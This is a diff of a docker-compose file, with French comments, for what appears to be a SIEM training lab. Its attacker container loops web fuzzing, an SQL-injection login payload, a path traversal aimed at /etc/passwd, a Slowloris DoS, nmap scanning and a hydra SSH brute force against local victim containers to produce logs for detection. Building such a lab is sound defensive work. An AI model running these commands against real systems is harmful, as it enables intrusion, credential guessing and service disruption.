@@ -69,35 +69,57 @@ services:
     container_name: attacker_bot
     command: >
       bash -c "
-      echo '--- INSTALLATION ---';
-      apt-get update && apt-get install -y hydra curl nmap;
+      echo '--- [INIT] INSTALLATION DES OUTILS ---';
+      apt-get update && apt-get install -y hydra curl nmap slowhttptest &&
       
-      echo '--- GENERATION WORDLIST ---';
-      # CORRECTION ICI : $$i au lieu de $i
-      for i in {1..1000}; do echo 'pass_wrong_$$i' >> /tmp/passlist.txt; done;
+      echo '--- [INIT] GENERATION WORDLIST ---';
+      rm -f /tmp/passlist.txt &&
+      for i in {1..1000}; do echo pass_wrong_$$i >> /tmp/passlist.txt; done &&
       
-      echo '--- DEMARRAGE DU GENERATEUR DE BRUIT ---';
+      echo '--- DEMARRAGE DE LA BOUCLE D ATTAQUE ---';
       while true; do
-        echo '[CYCLE] Lancement des attaques simultanées...';
         
-        # 1. SSH
-        hydra -l root -P /tmp/passlist.txt -t 16 victim_server ssh &
-        
-        # 2. WEB 404 : CORRECTION ICI ($$i)
-        for i in {1..50}; do
+        # --- PHASE 1 : BRUIT WEB (Fuzzing & 404) ---
+        # C'est ce qui alimente ton panneau 'Web Fuzzing' actuel
+        echo '[PHASE 1] Web Fuzzing (Generation 404)...';
+        for i in {1..30}; do
           curl -s -o /dev/null http://web_server/admin_hidden_$$i.php &
-        done
-        
-        # 3. NMAP
-        curl -s -A 'Mozilla/5.0 (compatible; Nmap Scripting Engine)' http://web_server/vulnerability_scan &
-        
-        sleep 15;
+        done;
+
+        # --- PHASE 2 : ATTAQUES WEB AVANCEES (SQLi & Traversal) ---
+        # Nouveaux vecteurs pour les nouveaux notebooks
+        echo '[PHASE 2] Web Attacks (SQLi & Path Traversal)...';
+        for i in {1..10}; do
+          # Injection SQL
+          curl -s 'http://web_server/login?user=admin&pass=%27%20OR%201%3D1%20--' > /dev/null &
+          # Path Traversal (Tentative d'accès à /etc/passwd)
+          curl -s 'http://web_server/../../etc/passwd' > /dev/null &
+        done;
+
+        # --- PHASE 3 : DENI DE SERVICE (L7 DoS) ---
+        # On lance Slowloris en arrière-plan pendant 20 secondes
+        echo '[PHASE 3] L7 DoS (Slowloris)...';
+        slowhttptest -c 50 -H -g -o /dev/null -i 10 -r 200 -t GET -u http://web_server/ -x 24 -p 3 -l 20 &
+
+        # --- PHASE 4 : SCAN RESEAU ---
+        # On utilise Nmap en mode 'aggressif' (-A) pour générer plus de logs
+        echo '[PHASE 4] Network Scanning (Nmap)...';
+        curl -s -A 'Mozilla/5.0 (compatible; Nmap Scripting Engine)' http://web_server/scan_signature_check;
+        nmap -F -T4 web_server > /dev/null;
+
+        # --- PHASE 5 : BRUTEFORCE SSH ---
+        # On le met à la fin en mode 'bloquant' (sans &) pour temporiser la boucle
+        echo '[PHASE 5] SSH Bruteforce (Hydra)...';
+        hydra -l root -P /tmp/passlist.txt -t 4 victim_server ssh;
+
+        echo '[CYCLE END] Pause respiration (5s)...';
+        sleep 5;
       done"
     networks:
       - siem-net
     depends_on:
       - victim
-      - web_victim # Attention: dépendance sur le container web
+      - web_victim
   
   web_victim:
       image: nginx:alpine
